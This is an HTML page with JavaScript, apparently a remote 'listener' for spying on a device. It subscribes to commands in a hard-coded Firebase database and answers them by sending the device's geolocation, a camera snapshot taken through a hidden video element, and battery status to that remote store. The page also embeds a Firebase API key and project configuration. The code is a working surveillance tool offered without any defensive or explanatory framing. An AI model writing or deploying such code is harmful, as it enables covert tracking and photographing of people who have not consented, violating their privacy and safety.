<!DOCTYPE html>
<html>
<head>
  <title>Device Listener</title>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
</head>
<body>
  <h2>Listener Activated</h2>
  <video id="camera" autoplay style="display:none;"></video>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyA3eivOxIpneLJYcmqAUrmVQaURCipy9oo",
      authDomain: "remotecontrolapp-47b9f.firebaseapp.com",
      databaseURL: "https://remotecontrolapp-47b9f-default-rtdb.firebaseio.com",
      projectId: "remotecontrolapp-47b9f",
      storageBucket: "remotecontrolapp-47b9f.appspot.com",
      messagingSenderId: "601641517639",
      appId: "1:601641517639:web:9c87d179951bb2811ee762"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Command Listener
    db.ref("commands").on("value", async (snapshot) => {
      const data = snapshot.val();
      if (!data || !data.action) return;

      if (data.action === "get_location") {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(position => {
            db.ref("responses/location").set({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              timestamp: Date.now()
            });
          });
        }
      }

      else if (data.action === "take_picture") {
        const video = document.getElementById("camera");
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        await new Promise(resolve => setTimeout(resolve, 2000));
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);

        const image = canvas.toDataURL("image/jpeg");
        db.ref("responses/image").set({
          image,
          timestamp: Date.now()
        });

        stream.getTracks().forEach(track => track.stop());
      }

      else if (data.action === "battery_status") {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          db.ref("responses/battery").set({
            level: battery.level,
            charging: battery.charging,
            timestamp: Date.now()
          });
        }
      }
    });
  </script>
</body>
</html>
